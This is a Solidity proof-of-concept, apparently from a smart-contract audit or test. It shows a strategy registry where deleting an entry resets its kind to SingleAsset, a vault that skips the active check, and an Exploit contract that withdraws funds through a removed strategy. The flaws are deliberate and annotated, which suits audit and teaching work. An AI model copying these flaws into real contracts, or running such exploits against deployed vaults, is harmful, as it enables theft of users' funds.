// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

enum StrategyKind {
    SingleAsset,
    PairAsset
}

contract StrategyRegistry {
    struct Entry {
        StrategyKind kind;
        bool active;
    }
    mapping(address => Entry) public strategies;

    function addStrategy(address strategy, StrategyKind kind) external {
        strategies[strategy] = Entry(kind, true);
    }

    function removeStrategy(address strategy) external {
        // @> VULN: delete silently turns every removed strategy into kind 0.
        delete strategies[strategy];
    }
}

contract SingleAssetStrategy {
    uint256 public liquidity;

    constructor(uint256 initialLiquidity) {
        liquidity = initialLiquidity;
    }

    function withdraw(uint256 amount) external returns (uint256) {
        uint256 out = amount > liquidity ? liquidity : amount;
        liquidity -= out;
        return out;
    }
}

contract PrimeStrategy {
    StrategyRegistry public registry;
    address public priority;

    constructor(StrategyRegistry reg) {
        registry = reg;
    }

    function setPriority(address strategy) external {
        priority = strategy;
    }

    function withdraw(uint256 shortfall) external returns (uint256 withdrawn) {
        (StrategyKind kind,) = registry.strategies(priority);
        // @> VULN: active is ignored; deleted PairAsset entries can also
        // become SingleAsset and still reach the external withdrawal call.
        if (kind == StrategyKind.SingleAsset) {
            withdrawn = SingleAssetStrategy(priority).withdraw(shortfall);
        }
    }
}

contract Exploit {
    StrategyRegistry public registry;
    SingleAssetStrategy public strategy;
    PrimeStrategy public vault;
    uint256 public withdrawnAfterRemoval;

    constructor() {
        registry = new StrategyRegistry();
        strategy = new SingleAssetStrategy(100);
        vault = new PrimeStrategy(registry);
    }

    function run() external {
        registry.addStrategy(address(strategy), StrategyKind.SingleAsset);
        vault.setPriority(address(strategy));
        registry.removeStrategy(address(strategy));
        withdrawnAfterRemoval = vault.withdraw(100);
        require(withdrawnAfterRemoval == 100, "removed strategy was skipped");
        (, bool active) = registry.strategies(address(strategy));
        require(!active, "strategy still active");
    }
}
